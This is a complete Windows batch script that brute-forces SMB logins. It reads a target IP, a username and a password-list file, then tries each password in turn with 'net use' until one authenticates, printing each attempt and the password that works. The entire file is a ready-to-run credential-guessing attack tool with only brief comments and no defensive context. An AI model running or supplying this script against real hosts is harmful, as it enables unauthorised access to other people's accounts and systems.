@echo off

title Bruteforce Over SMB
REM Sets the console window title

color A
echo.

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p passwordslist="Enter Password List: "
set /a count=1

for /f %%a in (%passwordslist%) do (
  REM Loop through each line in the password list
  set pass=%%a
  call :attempt
)
REM If the loop ends without success, no valid password was found
echo Password not Found :(
pause
exit

:success
REM Label reached if a valid password is found
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
REM Disconnect from the SMB share
pause
exit

:attempt
REM Attempts a connection with the current password
net use \\%ip% /user:%user% %pass% >nul 2>&1
REM Attempt to connect using the current password
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
REM If authentication is successful, jump to the success label
